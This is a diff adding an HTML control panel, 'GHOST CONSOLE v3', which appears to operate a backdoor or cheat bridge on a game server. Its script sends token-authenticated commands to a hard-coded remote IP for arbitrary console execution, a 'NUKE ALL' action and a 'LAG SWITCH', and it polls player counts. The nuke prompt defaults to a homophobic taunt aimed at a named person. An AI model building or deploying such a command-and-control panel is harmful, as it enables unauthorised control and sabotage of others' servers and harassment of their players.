@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>GHOST CONSOLE v3</title>
+    <style>
+        body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
+        .panel { border: 1px solid #333; margin: 15px 0; padding: 15px; background: #0a0a0a; }
+        h2 { color: #fff; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
+        button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 8px 16px; cursor: pointer; margin: 5px; }
+        button:hover { background: #0f0; color: #000; }
+        input { background: #000; color: #0f0; border: 1px solid #333; padding: 8px; width: 250px; }
+        #status { color: #ff0; }
+        #logArea { height: 300px; overflow-y: auto; background: #000; border: 1px solid #333; padding: 10px; font-size: 12px; white-space: pre-wrap; }
+        .danger { color: #f00; }
+    </style>
+</head>
+<body>
+    <h1 style="margin: 0 0 20px 0;">GHOST CONSOLE v3</h1>
+
+    <div class="panel">
+        <h2>System Status</h2>
+        <p id="status">INITIALIZING...</p>
+    </div>
+
+    <div class="panel">
+        <h2>Console Execution</h2>
+        <input type="text" id="consoleInput" placeholder="e.g. list_resources">
+        <button onclick="sendCommand('console')">EXECUTE</button>
+        <button onclick="triggerNuke()">NUKE ALL</button>
+        <button onclick="triggerLag()">LAG SWITCH (5s)</button>
+        <hr style="border-color:#333">
+        <div id="logArea">Waiting for input...</div>
+    </div>
+
+    <script>
+        const BRIDGE_URL = 'http://103.1.215.149'; // CHANGE TO YOUR DEDICATED SERVER IP
+        const TOKEN = 'GHOST_2025';
+
+        function log(msg, isError = false) {
+            const el = document.getElementById('logArea');
+            const time = new Date().toLocaleTimeString();
+            el.innerText += `[${time}] ${msg}\n`;
+            if (isError) el.style.color = '#f00'; else el.style.color = '#0f0';
+            el.scrollTop = el.scrollHeight;
+        }
+
+        async function sendCommand(action, payload = {}) {
+            try {
+                const res = await fetch(`${BRIDGE_URL}/api/exec`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'X-Ghost-Token': TOKEN 
+                    },
+                    body: JSON.stringify({ action, ...payload })
+                });
+                
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                
+                const data = await res.json();
+                log(`SUCCESS: ${JSON.stringify(data)}`);
+            } catch(e) {
+                log(`ERROR: ${e.message}`, true);
+            }
+        }
+
+        function triggerNuke() {
+            const text = prompt("Nuke Text:", "Matt Is Gay - Batman Likes Blokes");
+            if (text) sendCommand('nuke', { customText: text });
+        }
+
+        function triggerLag() {
+            sendCommand('lag', { duration: 5 });
+        }
+
+        // Main Input Handler
+        document.getElementById('consoleInput').addEventListener('keyup', function(e) {
+            if (e.key === 'Enter') {
+                const cmd = this.value;
+                if (cmd) {
+                    sendCommand('console', { input: cmd });
+                    this.value = '';
+                }
+            }
+        });
+
+        // Telemetry Polling (Optional/Visual)
+        setInterval(async () => {
+            try {
+                const res = await fetch(`${BRIDGE_URL}/api/stats`, {
+                    headers: { 'X-Ghost-Token': TOKEN }
+                });
+                if (res.ok) {
+                    const stats = await res.json();
+                    document.getElementById('status').innerText = `LINK ACTIVE | Players: ${stats.players || 'Unknown'}`;
+                    document.getElementById('status').style.color = '#0f0';
+                } else {
+                    throw new Error('HTTP Error');
+                }
+            } catch(e) {
+                document.getElementById('status').innerText = `CONNECTION LOST: ${e.message}`;
+                document.getElementById('status').style.color = '#f00';
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
